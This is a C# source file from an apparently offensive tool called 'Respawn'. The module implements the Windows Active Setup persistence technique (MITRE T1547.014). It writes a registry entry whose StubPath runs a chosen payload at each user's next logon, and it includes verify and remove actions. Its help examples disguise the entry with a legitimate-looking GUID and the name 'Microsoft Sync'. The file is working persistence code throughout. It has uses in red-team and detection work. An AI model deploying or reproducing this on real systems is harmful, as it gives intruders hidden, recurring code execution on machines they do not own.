using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.ActiveSetup
{
    public class ActiveSetupModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "active";
        public string Name        => "Active Setup";
        public string Mitre       => "T1547.014";
        public string Description => "Persist by abusing the Windows Active Setup registry mechanism. Registers a payload that Windows will automatically execute once for every user upon their next login.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string HklmPath = @"SOFTWARE\Microsoft\Active Setup\Installed Components";
        const string HkcuPath = @"SOFTWARE\Microsoft\Active Setup\Installed Components";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {

            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderOption("-n,  --name",        "Component name (GUID or unique identifier)");
            TechniqueHelpBuilder.RenderOption("-dn, --displayname", "Display name shown in registry");
            TechniqueHelpBuilder.RenderOption("-p,  --payload",     "Command to execute (exe, script, or built-in tool)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderExample("Respawn -t active -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t active -a install -n \"{31B2F340-016D-11D2-945F-00C04FB984F9}\" -dn \"Microsoft Sync\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t active -a verify  -n \"{31B2F340-016D-11D2-945F-00C04FB984F9}\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t active -a remove  -n \"{31B2F340-016D-11D2-945F-00C04FB984F9}\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return ActiveSetupKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(HklmPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening Active Setup registry key. Run as administrator.");

                // check if HKLM subkey already exists
                var existingHklm = baseKey.OpenSubKey(ctx.Name);
                if (existingHklm != null)
                {
                    existingHklm.Close();
                    return TechniqueResult.Exists($"Active Setup entry '{ctx.Name}' already exists in HKLM.");
                }

                // check if HKCU tracking entry exists — warn and abort
                using var hkcuBase   = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(HkcuPath, writable: false);
                var       existingHkcu = hkcuBase?.OpenSubKey(ctx.Name);
                if (existingHkcu != null)
                {
                    existingHkcu.Close();
                    return TechniqueResult.Exists(
                        $"Active Setup entry '{ctx.Name}' already exists in HKCU. ");
                }

                // create HKLM subkey
                using var subKey = baseKey.CreateSubKey(ctx.Name, writable: true);
                if (subKey == null)
                    return TechniqueResult.Fail($"Failed to create subkey '{ctx.Name}'.");

                subKey.SetValue("StubPath",    ctx.Payload);
                subKey.SetValue("Version",     "1,0,0,0");
                subKey.SetValue("IsInstalled", 1, RegistryValueKind.DWord);

                if (!string.IsNullOrEmpty(ctx.DisplayName))
                    subKey.SetValue("", ctx.DisplayName);

                return TechniqueResult.Ok(
                    $"Installed Active Setup entry '{ctx.Name}' -> '{ctx.Payload}'.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Active Setup requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                bool removedHklm = false;
                bool removedHkcu = false;

                // remove HKLM entry
                using var hklmBase = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(HklmPath, writable: true);
                if (hklmBase != null)
                {
                    var existingHklm = hklmBase.OpenSubKey(ctx.Name);
                    if (existingHklm != null)
                    {
                        existingHklm.Close();
                        hklmBase.DeleteSubKeyTree(ctx.Name);
                        removedHklm = true;
                    }
                }

                // remove HKCU tracking entry
                using var hkcuBase = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(HkcuPath, writable: true);
                if (hkcuBase != null)
                {
                    var existingHkcu = hkcuBase.OpenSubKey(ctx.Name);
                    if (existingHkcu != null)
                    {
                        existingHkcu.Close();
                        hkcuBase.DeleteSubKeyTree(ctx.Name);
                        removedHkcu = true;
                    }
                }

                if (!removedHklm && !removedHkcu)
                    return TechniqueResult.NotFound($"Active Setup entry '{ctx.Name}' not found in HKLM or HKCU.");

                return TechniqueResult.Ok(
                    $"Removed Active Setup entry '{ctx.Name}' | " +
                    $"HKLM: {(removedHklm ? "removed" : "not found")} | " +
                    $"HKCU: {(removedHkcu ? "removed" : "not found")}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Active Setup requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                // check HKLM
                using var hklmBase = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(HklmPath, writable: false);
                using var hklmKey  = hklmBase?.OpenSubKey(ctx.Name);

                if (hklmKey == null)
                    return TechniqueResult.NotFound($"Active Setup entry '{ctx.Name}' not found in HKLM.");

                string payload     = hklmKey.GetValue("StubPath")?.ToString()    ?? "unknown";
                string displayName = hklmKey.GetValue("")?.ToString()             ?? "unknown";
                string version     = hklmKey.GetValue("Version")?.ToString()      ?? "unknown";
                int    installed   = (int)(hklmKey.GetValue("IsInstalled") ?? 0);

                // check HKCU tracking entry
                using var hkcuBase = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(HkcuPath, writable: false);
                using var hkcuKey  = hkcuBase?.OpenSubKey(ctx.Name);
                string hkcuStatus  = hkcuKey != null
                    ? $"EXISTS (version: {hkcuKey.GetValue("Version")?.ToString() ?? "unknown"}) — payload will NOT fire until version is bumped or HKCU entry is removed"
                    : "NOT FOUND — payload will fire on next logon";

                return TechniqueResult.Ok(
                    $"Verified Active Setup '{ctx.Name}' | " +
                    $"Display: '{displayName}' | " +
                    $"Payload: '{payload}' | " +
                    $"Version: '{version}' | " +
                    $"IsInstalled: {installed} | " +
                    $"HKCU tracking: {hkcuStatus}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Active Setup requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No name specified. Use -n <name> (e.g. {GUID} or any unique string).";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <payload>.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}